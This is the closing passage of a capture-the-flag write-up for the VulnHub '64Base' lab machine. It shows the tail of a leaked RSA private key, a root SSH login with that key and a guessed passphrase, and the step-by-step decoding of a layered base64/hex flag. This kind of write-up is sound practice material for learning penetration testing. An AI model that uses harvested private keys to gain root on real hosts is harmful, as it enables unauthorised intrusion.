64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
-----END RSA PRIVATE KEY-----

{% endhighlight %}

<p>Great, we have <b>RSA Private Key</b>! Now, here's when magic happened. I tried to login to the SSH, using root account with, just obtained, RSA key. Before even trying to crack the password, I tried a few hints that were given to us during this challenge. Luckily, with my amusement, I've found that <b>usetheforce</b> is correct password! </p>

{% highlight bash %}
root@kali:~# chmod 600 key.txt
root@kali:~# ssh root@192.168.56.102 -p 62964 -i key.txt
Enter passphrase for key 'key.txt':

Last login: Wed Dec  7 16:27:53 2016 from localhost

flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
root@64base:~#
{% endhighlight %}

<p>Awesome! Now we can decode this flag. </p>

{% highlight bash %}
root@kali:~# echo NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK | base64 -d
4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a
root@kali:~# echo 4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a | xxd -r -p
NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo=
root@kali:~# echo NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo= | base64 -d
596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a
root@kali:~# echo 596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a | xxd -r -p
YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg==
root@kali:~# echo YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg== | base64 -d
base64 -d /var/local/.luke|less.real
{% endhighlight %}

<p>What can it be? </p>

![Finish](/img/64base/finish.png){:class="img-responsive center-block"}

<h1>Conclusion</h1>

<p>64Base was an awesome challenge, with lots of tricks, some hard, some easy, but all really entertaining and interesting. Big thanks to <a href="https://3mrgnc3.ninja/2016/12/64base/"><b>3mrgnc3</b></a> for creating this challenge, and <a href="https://www.vulnhub.com"><b>VulnHub</b></a> for hosting it! </p>
<p>I also hope, that you've enjoyed this write-up, I'll definitely do more of these in the future, so stay updated. And as always... </p>

<p>~ Stay safe! </p>
